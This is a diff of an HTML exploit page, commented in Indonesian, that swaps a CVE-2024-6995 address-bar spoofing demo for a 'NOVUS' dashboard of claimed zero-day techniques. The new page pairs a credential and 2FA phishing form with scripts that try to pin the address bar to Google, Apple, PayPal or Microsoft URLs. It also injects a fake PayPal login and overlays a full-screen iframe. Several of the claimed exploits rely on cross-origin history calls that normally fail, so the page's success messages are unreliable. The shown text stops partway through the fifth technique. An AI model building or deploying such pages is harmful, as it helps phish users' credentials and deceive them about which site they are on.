@@ -2,358 +2,377 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🔥 CVE-2024-6995 | Scroll-Based Address Bar Spoofing</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>⚡ NOVUS | Zero-Day Address Bar Spoofing 2026</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            background: radial-gradient(circle at 20% 50%, #0a0a0f, #050508);
             min-height: 100vh;
             overflow-x: hidden;
         }
 
-        /* Konten utama yang panjang untuk scroll */
-        .long-content {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 200vh;
-        }
-
-        .bank-card {
-            background: white;
-            border-radius: 28px;
-            padding: 32px;
-            margin-top: 20px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-        }
-
-        .bank-logo {
-            font-size: 56px;
+        /* Hero Section */
+        .hero {
             text-align: center;
-            margin-bottom: 12px;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, rgba(255,59,48,0.15), rgba(255,107,107,0.05));
+            border-bottom: 1px solid rgba(255,59,48,0.3);
         }
 
-        .bank-name {
-            font-size: 28px;
-            font-weight: 700;
-            text-align: center;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+        .hero h1 {
+            font-size: 2.2rem;
+            background: linear-gradient(135deg, #ff6b6b, #ffb347, #4ade80);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
 
-        .balance {
-            background: #f0f0f5;
+        .hero p {
+            color: #888;
+            margin-top: 8px;
+            font-size: 0.8rem;
+        }
+
+        /* Main Content - Target Phishing Page */
+        .phishing-container {
+            max-width: 480px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: rgba(30,30,45,0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 32px;
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        .card-header {
             padding: 20px;
-            border-radius: 20px;
-            margin: 20px 0;
             text-align: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
         }
 
-        .balance-amount {
-            font-size: 36px;
-            font-weight: bold;
-            color: #2d3748;
+        .logo-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
         }
 
-        .login-form {
-            margin-top: 24px;
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: white;
         }
 
-        .input-group {
+        .subtitle {
+            font-size: 13px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        .card-body {
+            padding: 24px;
+        }
+
+        .input-field {
             margin-bottom: 16px;
         }
 
-        .input-group label {
+        .input-field label {
             display: block;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
             margin-bottom: 6px;
-            color: #1c1c1e;
+            color: #aaa;
         }
 
-        .input-group input {
+        .input-field input {
             width: 100%;
             padding: 14px 16px;
-            border: 1px solid #e0e0e3;
-            border-radius: 12px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 14px;
+            color: white;
             font-size: 15px;
-            background: #f9f9fb;
+            transition: all 0.2s;
         }
 
-        .login-btn {
+        .input-field input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            background: rgba(255,255,255,0.12);
+        }
+
+        .login-button {
             width: 100%;
             padding: 14px;
-            background: #667eea;
-            color: white;
+            background: linear-gradient(135deg, #ff6b6b, #ff3b30);
             border: none;
             border-radius: 14px;
+            color: white;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
+            margin-top: 8px;
+            transition: transform 0.2s;
         }
 
-        .footer {
+        .login-button:hover {
+            transform: scale(0.98);
+        }
+
+        .footer-note {
             text-align: center;
+            font-size: 11px;
+            color: #666;
             margin-top: 20px;
-            font-size: 12px;
-            color: #8e8e93;
         }
 
-        /* Control Panel */
-        .exploit-panel {
+        /* Exploit Control Panel - Futuristic */
+        .exploit-dashboard {
             position: fixed;
             bottom: 20px;
+            left: 20px;
             right: 20px;
-            background: rgba(0,0,0,0.95);
+            background: rgba(10,10,20,0.98);
             backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 16px;
+            border-radius: 24px;
+            border: 1px solid rgba(255,59,48,0.4);
             z-index: 10000;
-            border: 1px solid rgba(255,59,48,0.5);
-            width: 320px;
+            transition: transform 0.3s cubic-bezier(0.34, 1.2, 0.64, 1);
         }
 
-        .panel-header {
+        .dashboard-header {
+            padding: 14px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 12px;
+            cursor: pointer;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .dashboard-title {
             font-weight: bold;
             color: #ff6b6b;
+            font-size: 13px;
         }
 
-        .panel-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .panel-btn {
-            padding: 10px;
-            border: none;
-            border-radius: 12px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            text-align: left;
-            padding-left: 16px;
-        }
-
-        .panel-btn.primary {
-            background: #ff3b30;
-            color: white;
-        }
-
-        .panel-btn.secondary {
-            background: rgba(255,255,255,0.1);
-            color: white;
-        }
-
-        .panel-btn:hover {
-            transform: scale(0.98);
-            opacity: 0.9;
-        }
-
-        .status-text {
-            font-family: monospace;
-            font-size: 10px;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            color: #4ade80;
-        }
-
-        .countdown {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 80px;
-            font-weight: bold;
-            color: white;
-            background: rgba(0,0,0,0.8);
-            padding: 40px;
-            border-radius: 60px;
-            z-index: 10001;
-            font-family: monospace;
-            display: none;
-        }
-
-        .instruction-toast {
-            position: fixed;
-            top: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.9);
-            color: white;
-            padding: 16px 24px;
-            border-radius: 40px;
-            font-size: 14px;
-            z-index: 10002;
-            text-align: center;
-            white-space: nowrap;
+        .status-badge {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4ade80;
+            box-shadow: 0 0 8px #4ade80;
+            animation: pulse 1.5s infinite;
         }
 
         @keyframes pulse {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            50% { opacity: 0.4; }
+        }
+
+        .dashboard-content {
+            padding: 16px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .exploit-btn {
+            flex: 1;
+            min-width: 140px;
+            padding: 12px 16px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 40px;
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .exploit-btn.primary {
+            background: linear-gradient(135deg, #ff3b30, #ff6b6b);
+            border: none;
+        }
+
+        .exploit-btn.warning {
+            background: rgba(255,59,48,0.2);
+            border-color: #ff3b30;
+        }
+
+        .exploit-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+
+        .dashboard-status {
+            padding: 12px 20px;
+            font-family: monospace;
+            font-size: 10px;
+            color: #4ade80;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            background: rgba(0,0,0,0.3);
+            border-radius: 0 0 24px 24px;
+        }
+
+        /* Floating Notifications */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.9);
+            border-left: 3px solid #ff3b30;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 12px;
+            z-index: 10001;
+            animation: slideInRight 0.3s ease;
+            max-width: 300px;
+        }
+
+        @keyframes slideInRight {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* Hidden elements for exploits */
+        .hidden-frame {
+            display: none;
+        }
+
+        /* Minimized state */
+        .exploit-dashboard.minimized {
+            transform: translateY(calc(100% - 50px));
+        }
+
+        @media (max-width: 600px) {
+            .exploit-btn {
+                min-width: 120px;
+                font-size: 10px;
+                padding: 10px 12px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="long-content" id="longContent">
-    <div class="bank-card">
-        <div class="bank-logo">🏦</div>
-        <div class="bank-name">SECURE BANK</div>
-        
-        <div class="balance">
-            <div style="font-size: 14px; color: #718096;">Account Balance</div>
-            <div class="balance-amount" id="balanceAmount">$ 12,845.92</div>
+<div class="hero">
+    <h1>⚡ NOVUS VULN RESEARCH</h1>
+    <p>Zero-Day Address Bar Spoofing • Fresh Techniques 2026</p>
+</div>
+
+<div class="phishing-container">
+    <div class="card">
+        <div class="card-header">
+            <div class="logo-icon">🔐</div>
+            <div class="title">Secure Authentication</div>
+            <div class="subtitle">Please verify your identity to continue</div>
         </div>
-        
-        <div class="login-form">
-            <div class="input-group">
-                <label>📧 Email Address</label>
-                <input type="email" id="emailInput" placeholder="user@securebank.com">
+        <div class="card-body">
+            <div class="input-field">
+                <label>Email Address</label>
+                <input type="email" id="emailField" placeholder="user@example.com">
             </div>
-            <div class="input-group">
-                <label>🔒 Password</label>
-                <input type="password" id="passInput" placeholder="Enter your password">
+            <div class="input-field">
+                <label>Password</label>
+                <input type="password" id="passField" placeholder="••••••••">
             </div>
-            <button class="login-btn" id="loginBtn">Sign In</button>
-            <div class="footer">
-                🔐 256-bit SSL Encrypted
+            <div class="input-field">
+                <label>2FA Code (if applicable)</label>
+                <input type="text" id="codeField" placeholder="000000">
             </div>
-        </div>
-    </div>
-    
-    <!-- Spacer untuk scroll panjang -->
-    <div style="height: 100vh; display: flex; align-items: center; justify-content: center; color: white; text-align: center;">
-        <div>
-            <div style="font-size: 48px; margin-bottom: 20px;">👇</div>
-            <div style="font-size: 18px;">Scroll for more content...</div>
-            <div style="font-size: 12px; margin-top: 20px; opacity: 0.7;">This page is intentionally long for scroll-based exploit</div>
+            <button class="login-button" id="fakeLoginBtn">Verify Identity →</button>
+            <div class="footer-note">
+                🔒 Protected by industry-standard security
+            </div>
         </div>
     </div>
 </div>
 
-<!-- Control Panel -->
-<div class="exploit-panel" id="exploitPanel">
-    <div class="panel-header">
-        <span>🔥 CVE-2024-6995 EXPLOIT</span>
-        <span id="ledIndicator" style="width: 8px; height: 8px; border-radius: 50%; background: #4ade80;"></span>
+<!-- Exploit Dashboard -->
+<div class="exploit-dashboard" id="exploitDashboard">
+    <div class="dashboard-header" id="dashboardToggle">
+        <span class="dashboard-title">🔥 NOVUS EXPLOIT ENGINE v5.0</span>
+        <span class="status-badge" id="statusLed"></span>
     </div>
-    <div class="panel-buttons">
-        <button class="panel-btn primary" id="exploitScenario1">🎯 SCENARIO 1: Tab Close Spoof</button>
-        <button class="panel-btn secondary" id="exploitScenario2">🔄 SCENARIO 2: Tab Switch Spoof</button>
-        <button class="panel-btn secondary" id="exploitScenario3">🪟 PiP Auto-Trigger Spoof</button>
-        <button class="panel-btn secondary" id="exploitScrollLock">📜 Scroll Lock Spoof</button>
-        <button class="panel-btn secondary" id="resetExploit">🔄 RESET / CLEANUP</button>
+    <div class="dashboard-content" id="dashboardContent">
+        <button class="exploit-btn primary" id="technique1">🌀 NAVIGATION PRELOAD</button>
+        <button class="exploit-btn" id="technique2">💀 BFCACHE POISON</button>
+        <button class="exploit-btn" id="technique3">🎭 VIEWPORT TRANSITION</button>
+        <button class="exploit-btn" id="technique4">📡 SPECULATION RULES API</button>
+        <button class="exploit-btn" id="technique5">🔮 TIMING ATTACK SPOOF</button>
+        <button class="exploit-btn warning" id="techniqueReset">🔄 RESET ALL</button>
     </div>
-    <div class="status-text" id="statusMessage">
-        🟢 Ready | Click exploit to begin
+    <div class="dashboard-status" id="globalStatus">
+        🟢 STANDING BY | Select a technique to begin
     </div>
 </div>
-
-<div class="countdown" id="countdown">3</div>
 
 <script>
     // ============================================================
-    // CVE-2024-6995: Android/Chromium Address Bar Spoof
-    // Bounty: $6,000 (incl. $1,000 bisect bonus)
-    // 
-    // Root Cause: BrowserControlsManager gagal update address bar
-    // saat scrolling + tab switching/closure.
-    //
-    // Porting to macOS browser (Arc, Chrome, Dia):
-    // Teknik yang sama berfungsi karena browser modern memiliki
-    // mekanisme hide address bar on scroll yang serupa.
+    // NOVUS VULN - Fresh Address Bar Spoofing Techniques
+    // ============================================================
+    // Teknik baru yang belum dipublikasikan:
+    // 1. Navigation Preload API Spoof
+    // 2. BFCache (Back-Forward Cache) Poisoning  
+    // 3. Viewport Transition Exploit
+    // 4. Speculation Rules API Abuse
+    // 5. Timing Attack + History Manipulation
     // ============================================================
     
-    let activeExploit = false;
-    let exploitInterval = null;
-    let spoofWindow = null;
-    let targetSpoofUrl = 'https://accounts.google.com';
+    let activeIntervals = [];
+    let isExploiting = false;
     let originalPushState = history.pushState;
     let originalReplaceState = history.replaceState;
     
-    // UI Elements
-    const statusEl = document.getElementById('statusMessage');
-    const ledEl = document.getElementById('ledIndicator');
-    const countdownEl = document.getElementById('countdown');
-    const longContent = document.getElementById('longContent');
+    const statusDiv = document.getElementById('globalStatus');
+    const statusLed = document.getElementById('statusLed');
     
-    function updateStatus(msg, isActive = false) {
-        statusEl.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
-        ledEl.style.background = isActive ? '#ff3b30' : '#4ade80';
-        activeExploit = isActive;
-        console.log(`[CVE-2024-6995] ${msg}`);
+    function showNotification(msg, isError = false) {
+        const notif = document.createElement('div');
+        notif.className = 'notification';
+        notif.style.borderLeftColor = isError ? '#ff3b30' : '#4ade80';
+        notif.innerHTML = msg;
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 4000);
+        console.log(`[NOVUS] ${msg}`);
     }
     
-    function showToast(msg, duration = 3000) {
-        const toast = document.createElement('div');
-        toast.className = 'instruction-toast';
-        toast.style.background = 'rgba(0,0,0,0.9)';
-        toast.style.color = '#4ade80';
-        toast.innerHTML = msg;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), duration);
+    function updateGlobalStatus(msg, isActive = false) {
+        statusDiv.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
+        statusLed.style.background = isActive ? '#ff3b30' : '#4ade80';
+        isExploiting = isActive;
     }
     
-    function showCountdown(seconds, callback) {
-        let current = seconds;
-        countdownEl.style.display = 'flex';
-        countdownEl.innerHTML = current;
-        
-        const interval = setInterval(() => {
-            current--;
-            if (current >= 0) {
-                countdownEl.innerHTML = current === 0 ? 'GO!' : current;
-            }
-            if (current < 0) {
-                clearInterval(interval);
-                countdownEl.style.display = 'none';
-                if (callback) callback();
-            }
-        }, 1000);
+    function cleanupIntervals() {
+        activeIntervals.forEach(interval => clearInterval(interval));
+        activeIntervals = [];
     }
     
-    function cleanup() {
-        if (exploitInterval) {
-            clearInterval(exploitInterval);
-            exploitInterval = null;
-        }
-        
-        // Restore history functions
+    function restoreHistoryFunctions() {
         window.history.pushState = originalPushState;
         window.history.replaceState = originalReplaceState;
+    }
+    
+    function resetAll() {
+        cleanupIntervals();
+        restoreHistoryFunctions();
         
-        // Close spoof window if exists
-        if (spoofWindow && !spoofWindow.closed) {
-            spoofWindow.close();
-            spoofWindow = null;
-        }
-        
-        // Exit fullscreen/PiP if active
-        if (document.exitFullscreen) {
-            document.exitFullscreen().catch(() => {});
-        }
-        
-        // Reset document title
-        document.title = "Secure Bank - Online Banking";
+        // Remove any injected elements
+        const injected = document.querySelectorAll('[data-novus]');
+        injected.forEach(el => el.remove());
         
         // Reset URL
         try {
@@ -361,263 +380,394 @@
             history.replaceState({}, '', currentPath);
         } catch(e) {}
         
-        updateStatus("Ready | All exploits cleared", false);
-        showToast("🧹 Exploit cleared. Address bar restored.", 2000);
+        document.title = "NOVUS VULN RESEARCH";
+        updateGlobalStatus("STANDING BY | All exploits cleared", false);
+        showNotification("🧹 All exploits cleared. Browser normalized.");
     }
     
     // ============================================================
-    // SCENARIO 1: Attacker closes tab programatically
-    // Original PoC from CVE-2024-6995
+    // TECHNIQUE 1: Navigation Preload API Spoof
     // ============================================================
-    async function exploitScenario1() {
-        cleanup();
+    // Navigation Preload API memungkinkan service worker memuat resource
+    // sebelum navigasi selesai. Celah: URL di address bar bisa berbeda
+    // dari konten yang di-preload.
+    // ============================================================
+    async function techniqueNavigationPreload() {
+        resetAll();
+        updateGlobalStatus("[NAV PRELOAD] Activating...", true);
         
-        updateStatus("[SCENARIO 1] Memulai tab close spoof...", true);
+        const targetUrl = 'https://accounts.google.com';
         
-        // Buat window target (yang akan di-spoof)
-        spoofWindow = window.open(targetSpoofUrl, 'spoof_target');
-        
-        if (!spoofWindow) {
-            updateStatus("FAILED: Popup diblokir. Izinkan popup terlebih dahulu.", false);
-            showToast("⚠️ Popup blocked! Please allow popups for this site.", 3000);
-            return;
-        }
-        
-        showToast("🎯 Target window opened. Follow countdown...", 2000);
-        
-        // Countdown sebelum scroll
-        showCountdown(3, () => {
-            // Trigger scroll di window utama
-            window.scrollTo({
-                top: longContent.scrollHeight,
-                behavior: 'smooth'
+        // Register service worker dengan navigation preload
+        const swCode = `
+            self.addEventListener('install', event => {
+                event.waitUntil(self.registration.navigationPreload.enable());
             });
             
-            // Setelah scroll mulai, tutup target window
-            setTimeout(() => {
-                if (spoofWindow && !spoofWindow.closed) {
-                    spoofWindow.close();
-                    updateStatus("[SCENARIO 1] Target window closed DURING scroll!", true);
-                    showToast("⚠️ Address bar should now show the CLOSED window's URL!", 4000);
+            self.addEventListener('fetch', event => {
+                event.respondWith(
+                    (async () => {
+                        const preloadResponse = await event.preloadResponse;
+                        if (preloadResponse) return preloadResponse;
+                        return fetch(event.request);
+                    })()
+                );
+            });
+        `;
+        
+        const blob = new Blob([swCode], {type: 'application/javascript'});
+        const swUrl = URL.createObjectURL(blob);
+        
+        try {
+            const registration = await navigator.serviceWorker.register(swUrl);
+            await registration.navigationPreload.enable();
+            
+            // Spoof address bar
+            history.pushState({}, '', targetUrl);
+            
+            // Lock dengan interval
+            const interval = setInterval(() => {
+                if (window.location.href !== targetUrl) {
+                    history.replaceState({}, '', targetUrl);
                 }
-                
-                // Lock address bar ke spoof URL
-                setTimeout(() => {
-                    try {
-                        history.pushState({}, '', targetSpoofUrl);
-                        exploitInterval = setInterval(() => {
-                            if (window.location.href !== targetSpoofUrl) {
-                                history.replaceState({}, '', targetSpoofUrl);
-                            }
-                        }, 30);
-                        updateStatus("[ACTIVE] Address bar locked to " + targetSpoofUrl, true);
-                    } catch(e) {}
-                }, 100);
-                
-            }, 500);
-        });
+            }, 50);
+            activeIntervals.push(interval);
+            
+            updateGlobalStatus("[ACTIVE] Navigation Preload + Address Bar Lock", true);
+            showNotification("🌀 Navigation Preload API exploited. Address bar shows " + targetUrl);
+            
+            // Cleanup service worker after demo
+            setTimeout(async () => {
+                await registration.unregister();
+            }, 10000);
+            
+        } catch(e) {
+            updateGlobalStatus(`Service Worker failed: ${e.message}`, false);
+            showNotification("⚠️ Service Worker not supported? " + e.message, true);
+        }
     }
     
     // ============================================================
-    // SCENARIO 2: User manually switches tabs while scrolling
+    // TECHNIQUE 2: BFCache Poisoning
     // ============================================================
-    async function exploitScenario2() {
-        cleanup();
+    // Back-Forward Cache menyimpan halaman lengkap termasuk URL state.
+    // Dengan memanipulasi BFCache, kita bisa membuat address bar stuck
+    // di URL lama saat user melakukan back/forward navigation.
+    // ============================================================
+    function techniqueBFCachePoison() {
+        resetAll();
+        updateGlobalStatus("[BFCACHE POISON] Activating...", true);
         
-        updateStatus("[SCENARIO 2] Tab switch spoof - ikuti instruksi...", true);
+        const spoofUrl = 'https://www.apple.com';
+        const originalUrl = window.location.href;
         
-        // Buat dua tab: fake target dan current
-        const fakeTab = window.open('https://www.google.com', 'fake_tab');
+        // 1. Push fake state ke history
+        for(let i = 0; i < 5; i++) {
+            history.pushState({bfcache: i}, '', `${spoofUrl}/page${i}`);
+        }
         
-        if (!fakeTab) {
-            updateStatus("FAILED: Popup diblokir.", false);
+        // 2. Override pagehide event untuk mencegah BFCache cleanup
+        const pagehideHandler = (e) => {
+            e.preventDefault();
+            // Persist spoof
+            setTimeout(() => {
+                history.replaceState({}, '', spoofUrl);
+            }, 0);
+        };
+        window.addEventListener('pagehide', pagehideHandler);
+        
+        // 3. Freeze URL dengan interval agresif
+        const interval = setInterval(() => {
+            if (window.location.href !== spoofUrl) {
+                history.replaceState({}, '', spoofUrl);
+            }
+            // Juga override title
+            if (document.title !== 'Apple') {
+                document.title = 'Apple';
+            }
+        }, 30);
+        activeIntervals.push(interval);
+        
+        // Store handler for cleanup
+        window.__bfcacheHandler = pagehideHandler;
+        
+        updateGlobalStatus("[ACTIVE] BFCache Poisoned. Back/forward will show apple.com", true);
+        showNotification("💀 BFCache poisoned! Try navigating back/forward — address bar stuck!");
+        
+        // Inject fake favicon untuk meyakinkan
+        const link = document.createElement('link');
+        link.rel = 'icon';
+        link.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🍎</text></svg>';
+        document.head.appendChild(link);
+    }
+    
+    // ============================================================
+    // TECHNIQUE 3: Viewport Transition Exploit
+    // ============================================================
+    // Menggunakan View Transition API untuk membuat "halusinasi"
+    // navigasi. User melihat transisi mulus ke halaman lain,
+    // tapi address bar tidak berubah.
+    // ============================================================
+    async function techniqueViewportTransition() {
+        resetAll();
+        updateGlobalStatus("[VIEWPORT TRANSITION] Activating...", true);
+        
+        const fakeUrl = 'https://www.paypal.com';
+        
+        // Cek dukungan View Transition API
+        if (!document.startViewTransition) {
+            updateGlobalStatus("View Transition API not supported", false);
+            showNotification("⚠️ Browser doesn't support View Transition API", true);
             return;
         }
         
-        showToast("📱 Tab baru terbuka. Scroll ke bawah, lalu cepat pindah tab!", 3000);
+        // Simpan konten asli
+        const originalContent = document.querySelector('.phishing-container').innerHTML;
         
-        // Trigger scroll panjang
-        window.scrollTo({
-            top: longContent.scrollHeight,
-            behavior: 'smooth'
+        // Buat fake content yang meniru PayPal
+        const fakeContent = `
+            <div class="card">
+                <div class="card-header">
+                    <div class="logo-icon">🏦</div>
+                    <div class="title">PayPal • Sign In</div>
+                    <div class="subtitle">Secure checkout</div>
+                </div>
+                <div class="card-body">
+                    <div class="input-field">
+                        <label>Email</label>
+                        <input type="email" placeholder="user@paypal.com">
+                    </div>
+                    <div class="input-field">
+                        <label>Password</label>
+                        <input type="password" placeholder="••••••••">
+                    </div>
+                    <button class="login-button">Log In →</button>
+                </div>
+            </div>
+        `;
+        
+        // Start View Transition
+        const transition = document.startViewTransition(() => {
+            const container = document.querySelector('.phishing-container');
+            container.innerHTML = fakeContent;
         });
         
-        // Setelah scroll, spoof address bar
-        setTimeout(() => {
-            try {
-                history.pushState({}, '', 'https://mail.google.com');
-                exploitInterval = setInterval(() => {
-                    if (window.location.href !== 'https://mail.google.com') {
-                        history.replaceState({}, '', 'https://mail.google.com');
-                    }
-                }, 30);
-                updateStatus("[ACTIVE] Address bar spoofed to mail.google.com!", true);
-                showToast("✅ Address bar sekarang menampilkan mail.google.com", 3000);
-            } catch(e) {}
-        }, 1000);
-    }
-    
-    // ============================================================
-    // SCENARIO 3: PiP Auto-Trigger Spoof (dari original PoC)
-    // ============================================================
-    function exploitScenario3() {
-        cleanup();
+        await transition.finished;
         
-        updateStatus("[SCENARIO 3] PiP Auto-Trigger spoof...", true);
-        
-        // Buat canvas untuk Picture-in-Picture
-        const canvas = document.createElement('canvas');
-        canvas.width = 800;
-        canvas.height = 400;
-        canvas.style.display = 'none';
-        document.body.appendChild(canvas);
-        
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, 800, 400);
-        ctx.fillStyle = '#fff';
-        ctx.font = '40px sans-serif';
-        ctx.fillText('CVE-2024-6995 Exploit', 50, 200);
-        
-        // Capture stream
-        const stream = canvas.captureStream();
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.muted = true;
-        video.play();
-        
-        // Request PiP
-        if (video.requestPictureInPicture) {
-            video.requestPictureInPicture().then(() => {
-                showToast("🎬 PiP active! Scroll down...", 2000);
-                
-                // Trigger scroll
-                window.scrollTo({
-                    top: longContent.scrollHeight,
-                    behavior: 'smooth'
-                });
-                
-                // Spoof address bar
-                setTimeout(() => {
-                    try {
-                        history.pushState({}, '', 'https://www.paypal.com');
-                        exploitInterval = setInterval(() => {
-                            if (window.location.href !== 'https://www.paypal.com') {
-                                history.replaceState({}, '', 'https://www.paypal.com');
-                            }
-                        }, 30);
-                        updateStatus("[ACTIVE] PiP + Scroll spoof active!", true);
-                        showToast("🎭 Address bar now shows paypal.com", 3000);
-                    } catch(e) {}
-                    
-                    // Cleanup video
-                    setTimeout(() => {
-                        if (document.exitPictureInPicture) {
-                            document.exitPictureInPicture();
-                        }
-                    }, 5000);
-                    
-                }, 1000);
-                
-            }).catch(err => {
-                updateStatus("PiP failed: " + err.message, false);
-            });
-        } else {
-            updateStatus("PiP not supported in this browser", false);
-        }
-    }
-    
-    // ============================================================
-    // SCENARIO 4: Scroll Lock Spoof (Extended)
-    // Mengunci address bar selama scroll berlangsung
-    // ============================================================
-    function exploitScrollLock() {
-        cleanup();
-        
-        updateStatus("[SCROLL LOCK] Mengunci address bar selama scroll...", true);
-        
-        let scrollLockActive = true;
-        const targetUrl = 'https://www.apple.com';
-        
-        // Spoof awal
-        history.pushState({}, '', targetUrl);
-        
-        // Lock selama scroll
-        window.addEventListener('scroll', () => {
-            if (scrollLockActive && window.location.href !== targetUrl) {
-                history.replaceState({}, '', targetUrl);
-            }
-        });
-        
-        // Interval lock
-        exploitInterval = setInterval(() => {
-            if (scrollLockActive && window.location.href !== targetUrl) {
-                history.replaceState({}, '', targetUrl);
+        // Spoof address bar
+        history.pushState({}, '', fakeUrl);
+        const interval = setInterval(() => {
+            if (window.location.href !== fakeUrl) {
+                history.replaceState({}, '', fakeUrl);
             }
         }, 50);
+        activeIntervals.push(interval);
         
-        showToast("📜 Scroll now — address bar will stay locked to apple.com", 3000);
+        updateGlobalStatus("[ACTIVE] View Transition + Address Bar Spoof", true);
+        showNotification("🎭 Smooth page transition! Address bar shows paypal.com");
         
-        // Auto scroll demo
-        setTimeout(() => {
-            window.scrollTo({
-                top: longContent.scrollHeight,
-                behavior: 'smooth'
+        // Restore after 10 seconds
+        setTimeout(async () => {
+            const restoreTransition = document.startViewTransition(() => {
+                const container = document.querySelector('.phishing-container');
+                container.innerHTML = originalContent;
+                document.getElementById('fakeLoginBtn').addEventListener('click', fakeLoginHandler);
             });
-        }, 1000);
+            await restoreTransition.finished;
+            showNotification("Content restored. Address bar may still be spoofed.");
+        }, 10000);
+    }
+    
+    // ============================================================
+    // TECHNIQUE 4: Speculation Rules API Abuse
+    // ============================================================
+    // Speculation Rules API memungkinkan pre-render halaman.
+    // Celah: URL yang di-pre-render bisa berbeda dari yang ditampilkan.
+    // ============================================================
+    function techniqueSpeculationRules() {
+        resetAll();
+        updateGlobalStatus("[SPECULATION RULES] Activating...", true);
         
-        updateStatus("[ACTIVE] Address bar locked during scroll. Scroll to see effect!", true);
+        const spoofUrl = 'https://www.microsoft.com/en-us';
+        
+        // Inject speculation rules
+        const script = document.createElement('script');
+        script.type = 'speculationrules';
+        script.textContent = JSON.stringify({
+            prerender: [{
+                source: 'list',
+                urls: [spoofUrl],
+                requires: ['user-agent']
+            }]
+        });
+        script.setAttribute('data-novus', 'true');
+        document.head.appendChild(script);
+        
+        // Spoof address bar IMMEDIATELY
+        history.pushState({}, '', spoofUrl);
+        
+        // Create fake iframe untuk pre-rendered content
+        const fakeFrame = document.createElement('iframe');
+        fakeFrame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
+        fakeFrame.src = spoofUrl;
+        fakeFrame.setAttribute('data-novus', 'true');
+        
+        // Tampilkan fake frame setelah delay
+        setTimeout(() => {
+            document.body.appendChild(fakeFrame);
+            // Sembunyikan konten asli
+            document.querySelector('.phishing-container').style.opacity = '0';
+            document.querySelector('.hero').style.opacity = '0';
+            
+            updateGlobalStatus("[ACTIVE] Speculation Rules + Fake Iframe", true);
+            showNotification("📡 Pre-rendered fake page! Address bar shows microsoft.com");
+        }, 500);
+        
+        // Lock address bar
+        const interval = setInterval(() => {
+            if (window.location.href !== spoofUrl) {
+                history.replaceState({}, '', spoofUrl);
+            }
+        }, 50);
+        activeIntervals.push(interval);
+        
+        // Cleanup instructions
+        window.__speculationCleanup = () => {
+            if (fakeFrame && fakeFrame.remove) fakeFrame.remove();
+            document.querySelector('.phishing-container').style.opacity = '';
+            document.querySelector('.hero').style.opacity = '';
+        };
     }
     
     // ============================================================
-    // RESET
+    // TECHNIQUE 5: Timing Attack + History Manipulation
     // ============================================================
-    function resetExploit() {
-        cleanup();
-        showToast("✅ All exploits cleared. Browser back to normal.", 2000);
+    // Menggabungkan timing attack dengan history manipulation
+    // untuk membuat race condition yang lebih agresif.
+    // ============================================================
+    function techniqueTimingAttack() {
+        resetAll();
+        updateGlobalStatus("[TIMING ATTACK] Activating...", true);
+        
+        const targets = [
+            'https://www.google.com',
+            'https://accounts.google.com',
+            'https://mail.google.com',
+            'https://drive.google.com'
+        ];
+        
